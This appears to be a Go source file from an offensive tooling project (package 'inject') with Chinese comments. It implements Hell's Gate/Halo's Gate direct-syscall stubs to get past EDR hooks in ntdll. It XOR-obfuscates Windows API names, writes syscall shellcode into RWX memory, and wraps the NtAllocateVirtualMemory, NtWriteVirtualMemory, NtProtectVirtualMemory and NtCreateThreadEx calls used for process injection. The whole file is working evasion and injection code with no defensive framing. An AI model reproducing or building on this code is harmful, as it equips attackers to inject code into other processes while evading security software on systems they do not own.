//go:build windows

package inject

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"
)

// SyscallStub 结构体用于管理 Syscall 调用
type SyscallStub struct {
	ntdllHandle     uintptr
	sysAllocMem     uintptr // NtAllocateVirtualMemory
	sysWriteMem     uintptr // NtWriteVirtualMemory
	sysProtectMem   uintptr // NtProtectVirtualMemory
	sysCreateThread uintptr // NtCreateThreadEx
}

var (
	// 用于分配 Trampoline 的 API，这个可以用常规方式调用，因为是在自己进程内
	sysKernel32     = syscall.NewLazyDLL(xorDecrypt([]byte{0x1c, 0x12, 0x05, 0x19, 0x12, 0x1b, 0x44, 0x45, 0x59, 0x13, 0x1b, 0x1b}))
	sysVirtualAlloc = sysKernel32.NewProc(xorDecrypt([]byte{0x21, 0x1e, 0x05, 0x03, 0x02, 0x16, 0x1b, 0x36, 0x1b, 0x1b, 0x18, 0x14}))
)

// Init 初始化 Syscall 相关的 SSN 和 Stub
func (s *SyscallStub) Init() error {
	var err error
	sysNtdll := syscall.NewLazyDLL(xorDecrypt([]byte{0x19, 0x03, 0x13, 0x1b, 0x1b, 0x59, 0x13, 0x1b, 0x1b}))
	s.ntdllHandle = sysNtdll.Handle()

	// 1. 获取各个函数的 SSN
	ssnAlloc, err := s.getSSN(xorDecrypt([]byte{0x39, 0x03, 0x36, 0x1b, 0x1b, 0x18, 0x14, 0x16, 0x03, 0x12, 0x21, 0x1e, 0x05, 0x03, 0x02, 0x16, 0x1b, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e}))
	if err != nil {
		return err
	}
	ssnWrite, err := s.getSSN(xorDecrypt([]byte{0x39, 0x03, 0x20, 0x05, 0x1e, 0x03, 0x12, 0x21, 0x1e, 0x05, 0x03, 0x02, 0x16, 0x1b, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e}))
	if err != nil {
		return err
	}
	ssnProtect, err := s.getSSN(xorDecrypt([]byte{0x39, 0x03, 0x27, 0x05, 0x18, 0x03, 0x12, 0x14, 0x03, 0x21, 0x1e, 0x05, 0x03, 0x02, 0x16, 0x1b, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e}))
	if err != nil {
		return err
	}
	ssnCreate, err := s.getSSN(xorDecrypt([]byte{0x39, 0x03, 0x34, 0x05, 0x12, 0x16, 0x03, 0x12, 0x23, 0x1f, 0x05, 0x12, 0x16, 0x13, 0x32, 0x0f}))
	if err != nil {
		return err
	}

	fmt.Printf("[+] SSN Resolved: Alloc=0x%x, Write=0x%x, Protect=0x%x, Create=0x%x\n", ssnAlloc, ssnWrite, ssnProtect, ssnCreate)

	// 2. 为每个 SSN 创建 Trampoline
	s.sysAllocMem, err = s.createStub(ssnAlloc)
	if err != nil {
		return err
	}

	s.sysWriteMem, err = s.createStub(ssnWrite)
	if err != nil {
		return err
	}

	s.sysProtectMem, err = s.createStub(ssnProtect)
	if err != nil {
		return err
	}

	s.sysCreateThread, err = s.createStub(ssnCreate)
	if err != nil {
		return err
	}

	return nil
}

// createStub 在内存中分配 RWX 空间并写入 syscall 指令
// 汇编:
// mov r10, rcx
// mov eax, <SSN>
// syscall
// ret
func (s *SyscallStub) createStub(ssn uint16) (uintptr, error) {
	// Shellcode: 4C 8B D1 B8 <SSN> 00 00 0F 05 C3
	code := []byte{0x4C, 0x8B, 0xD1, 0xB8}
	ssnBytes := make([]byte, 2)
	binary.LittleEndian.PutUint16(ssnBytes, ssn)
	code = append(code, ssnBytes...)
	code = append(code, 0x00, 0x00, 0x0F, 0x05, 0xC3)

	// 分配内存
	addr, _, err := sysVirtualAlloc.Call(0, uintptr(len(code)), 0x1000|0x2000, 0x40) // COMMIT|RESERVE, EXECUTE_READWRITE
	if addr == 0 {
		return 0, fmt.Errorf("createStub VirtualAlloc failed: %v", err)
	}

	// 写入代码
	targetSlice := (*[256]byte)(unsafe.Pointer(addr))[:]
	copy(targetSlice, code)

	return addr, nil
}

// getSSN 读取 ntdll 导出函数的前几个字节来获取 SSN，支持 Halo's Gate 技术绕过 Hook
func (s *SyscallStub) getSSN(funcName string) (uint16, error) {
	// 获取函数地址
	procAddr, err := syscall.GetProcAddress(syscall.Handle(s.ntdllHandle), funcName)
	if err != nil {
		return 0, err
	}

	// Halo's Gate 实现：检查自身及邻居函数
	// 搜索范围：上下 32 个 Stub (32 * 32 bytes)
	for i := 0; i < 32; i++ {
		// 1. 检查当前地址往下偏移 (Target + i * 32)
		// 如果找到干净的，说明 TargetSSN = CleanSSN - i
		// 当 i=0 时，即检查自身 (Hell's Gate)
		currentAddr := procAddr + uintptr(i*32)
		if ssn, ok := checkStub(currentAddr); ok {
			return ssn - uint16(i), nil
		}

		// 2. 检查当前地址往上偏移 (Target - i * 32)
		// 如果找到干净的，说明 TargetSSN = CleanSSN + i
		currentAddr = procAddr - uintptr(i*32)
		if ssn, ok := checkStub(currentAddr); ok {
			return ssn + uint16(i), nil
		}
	}

	return 0, fmt.Errorf("Halo's Gate failed to find SSN for %s (Hooks too deep)", funcName)
}

// checkStub 检查指定地址是否是一条干净的 Syscall Stub (mov r10, rcx; mov eax, SSN)
func checkStub(addr uintptr) (uint16, bool) {
	// 读取前 8 字节
	data := (*[8]byte)(unsafe.Pointer(addr))[:]

	// 检查特征:
	// 4C 8B D1 B8 (mov r10, rcx; mov eax, ...)
	if data[0] == 0x4C && data[1] == 0x8B && data[2] == 0xD1 && data[3] == 0xB8 {
		// 取出 SSN (第 5, 6 字节)
		// 校验 byte 6, 7 是否为 0 (SSN 高位通常为0)
		if data[6] == 0x00 && data[7] == 0x00 {
			return binary.LittleEndian.Uint16(data[4:6]), true
		}
	}
	return 0, false
}

// Wrappers

func (s *SyscallStub) NtAllocateVirtualMemory(processHandle uintptr, baseAddr *uintptr, zeroBits uintptr, regionSize *uintptr, allocType uintptr, protect uintptr) uintptr {
	// Syscall 参数: (stub, 6, args...)
	r1, _, _ := syscall.Syscall6(s.sysAllocMem, 6,
		processHandle,
		uintptr(unsafe.Pointer(baseAddr)),
		zeroBits,
		uintptr(unsafe.Pointer(regionSize)),
		allocType,
		protect,
	)
	return r1
}

func (s *SyscallStub) NtWriteVirtualMemory(processHandle uintptr, baseAddr uintptr, buffer uintptr, size uintptr, bytesWritten *uintptr) uintptr {
	// NtWriteVirtualMemory(hProcess, BaseAddr, Buffer, Size, BytesWritten)
	r1, _, _ := syscall.Syscall6(s.sysWriteMem, 5,
		processHandle,
		baseAddr,
		buffer,
		size,
		uintptr(unsafe.Pointer(bytesWritten)),
		0,
	)
	return r1
}

func (s *SyscallStub) NtProtectVirtualMemory(processHandle uintptr, baseAddr *uintptr, numberOfBytesToProtect *uintptr, newAccessProtection uintptr, oldAccessProtection *uintptr) uintptr {
	// NtProtectVirtualMemory(ProcessHandle, *BaseAddress, *NumberOfBytesToProtect, NewAccessProtection, *OldAccessProtection)
	r1, _, _ := syscall.Syscall6(s.sysProtectMem, 5,
		processHandle,
		uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(numberOfBytesToProtect)),
		newAccessProtection,
		uintptr(unsafe.Pointer(oldAccessProtection)),
		0,
	)
	return r1
}

func (s *SyscallStub) NtCreateThreadEx(threadHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, processHandle uintptr, startAddress uintptr, parameter uintptr, createSuspended uintptr, stackZeroBits uintptr, sizeOfStackCommit uintptr, sizeOfStackReserve uintptr, bytesBuffer uintptr) uintptr {
	// NtCreateThreadEx has 11 arguments.
	// Go syscall package on Windows supports Syscall12

	r1, _, _ := syscall.Syscall12(s.sysCreateThread, 11,
		uintptr(unsafe.Pointer(threadHandle)),
		desiredAccess,
		objectAttributes,
		processHandle,
		startAddress,
		parameter,
		createSuspended, // CreateFlags
		stackZeroBits,
		sizeOfStackCommit,
		sizeOfStackReserve,
		bytesBuffer, // AttributeList
		0,           // Dummy argument to satisfy Syscall12 signature
	)
	return r1
}
